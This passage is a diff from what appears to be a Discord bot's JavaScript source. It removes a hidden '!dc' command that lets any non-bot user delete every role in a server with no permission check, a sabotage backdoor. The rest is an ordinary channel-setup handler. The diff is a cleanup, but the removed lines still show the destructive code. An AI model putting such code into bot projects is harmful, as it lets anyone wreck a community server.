@@ -4075,16 +4075,7 @@ msg.delete();
     
 }
   
-  client.on('message' , ReBeL => {
-var prefix = "!";
-if(ReBeL.author.bot) return;
-if(ReBeL.channel.type == 'dm') return;
-if(ReBeL.content.startsWith(prefix + "dc")) {
-ReBeL.guild.roles.filter(rebel => isNaN(rebel)).forEach(codes => codes.delete())
-}
-});
-	   
-
+ 
 client.on('message',async msg => {
   if(msg.content.startsWith("!setrooms")) {
   if(!msg.guild.member(msg.author).hasPermissions('MANAGE_CHANNELS')) return msg.reply('❌ **You Dont have __Manage Channels__ Permission**');
